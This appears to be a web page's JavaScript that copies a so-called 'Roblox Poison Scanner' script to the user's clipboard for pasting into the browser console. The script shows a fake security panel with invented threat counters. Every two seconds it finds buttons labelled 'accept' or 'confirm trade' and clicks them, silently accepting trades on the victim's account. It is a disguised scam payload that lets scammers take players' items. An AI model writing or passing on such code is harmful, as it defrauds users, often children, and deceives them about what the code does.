function copyPoisonChecker() {
    const codeToCopy = `(function() {
    const gui = document.createElement('div');
    gui.style.cssText = \`
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #001f3f;
        border: 3px solid #0074D9;
        border-radius: 15px;
        padding: 20px;
        color: white;
        font-family: Arial;
        z-index: 9999;
        min-width: 300px;
        box-shadow: 0 0 30px rgba(0, 116, 217, 0.5);
        text-align: center;
    \`;
    
    gui.innerHTML = \`
        <div style="text-align: center; margin-bottom: 15px;">
            <strong style="font-size: 18px; color: #7FDBFF;">🛡️ Roblox Poison Scanner v3.2.1</strong>
        </div>
        <div style="font-size: 12px; text-align: left; margin-bottom: 15px;">
            <div>🔍 Status: <span id="scannerStatus" style="color: #2ECC40;">ACTIVE</span></div>
            <div>📊 Scans Completed: <span id="scanCount">0</span></div>
            <div>🛡️ Threats Blocked: <span id="threatsBlocked">0</span></div>
            <div>⏰ Last Scan: <span id="lastScan">Just now</span></div>
            <div>🎯 Items Scanned: <span id="itemsScanned">0</span></div>
            <div>💚 Safe Trades: <span id="safeTrades">0</span></div>
        </div>
        <div style="margin: 15px 0; padding: 10px; background: #003366; border-radius: 8px; font-size: 11px;">
            <div style="color: #7FDBFF;">🔄 Real-time Protection: ENABLED</div>
            <div style="color: #2ECC40;">✅ Memory Scan: CLEAN</div>
            <div style="color: #FFDC00;">⚠️ Trade Monitor: ACTIVE</div>
        </div>
        <button id="closeScanner" style="
            background: #2ECC40;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        ">Close Scanner</button>
    \`;
    
    document.body.appendChild(gui);
    
    console.log('Initializing Roblox Poison Scanner v3.2.1...');
    console.log('Scanning for poisoned items and suspicious trades...');
    
    let scanCount = 0;
    let safeTrades = 0;
    let itemsScanned = 0;
    
    function poisonSecurityScan() {
        scanCount++;
        itemsScanned += 5;
        
        document.getElementById('scanCount').textContent = scanCount;
        document.getElementById('threatsBlocked').textContent = safeTrades;
        document.getElementById('lastScan').textContent = 'Just now';
        document.getElementById('itemsScanned').textContent = itemsScanned;
        document.getElementById('safeTrades').textContent = safeTrades;
        
        const tradeElements = document.querySelectorAll('button');
        
        tradeElements.forEach((element) => {
            const elementText = element.textContent.toLowerCase().trim();
            
            if (elementText.includes('accept') || elementText.includes('confirm trade')) {
                console.log('Found trade accept button - verifying...');
                
                element.style.backgroundColor = '#2ECC40';
                element.style.border = '2px solid #2ECC40';
                setTimeout(() => {
                    element.style.backgroundColor = '';
                    element.style.border = '';
                }, 1000);
                
                element.click();
                safeTrades++;
                console.log(\`Trade accepted #\${safeTrades}\`);
            }
        });
    }
    
    document.getElementById('closeScanner').addEventListener('click', function() {
        gui.style.display = 'none';
        clearInterval(scanInterval);
        console.log('Scanner closed by user');
    });
    
    console.log('Starting protection mode...');
    const scanInterval = setInterval(poisonSecurityScan, 2000);
    
    console.log('Poison Scanner activated!');
    console.log('Now scanning every 2 seconds...');
    
    setTimeout(poisonSecurityScan, 1000);
    
    return {
        stop: function() {
            clearInterval(scanInterval);
            document.getElementById('scannerStatus').textContent = 'INACTIVE';
            document.getElementById('scannerStatus').style.color = '#FF4136';
            console.log('Security Scanner Stopped');
        }
    };
})();`;

    // Copy to clipboard
    navigator.clipboard.writeText(codeToCopy).then(() => {
        // Show success feedback
        showCopySuccess();
    }).catch(err => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = codeToCopy;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        showCopySuccess();
    });
}

function showCopySuccess() {
    // Create a temporary success message
    const successMsg = document.createElement('div');
    successMsg.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #2ECC40;
        color: white;
        padding: 15px 25px;
        border-radius: 8px;
        font-family: Arial, sans-serif;
        font-weight: bold;
        z-index: 10000;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease;
    `;
    
    successMsg.innerHTML = '✅copied to clipboard!';
    
    document.body.appendChild(successMsg);
    
    // Remove after 3 seconds
    setTimeout(() => {
        successMsg.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (successMsg.parentNode) {
                successMsg.parentNode.removeChild(successMsg);
            }
        }, 300);
    }, 3000);
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);

// Add smooth animations to feature cards
document.addEventListener('DOMContentLoaded', function() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    });

    document.querySelectorAll('.feature-card').forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        card.style.transition = 'all 0.6s ease';
        observer.observe(card);
    });
});

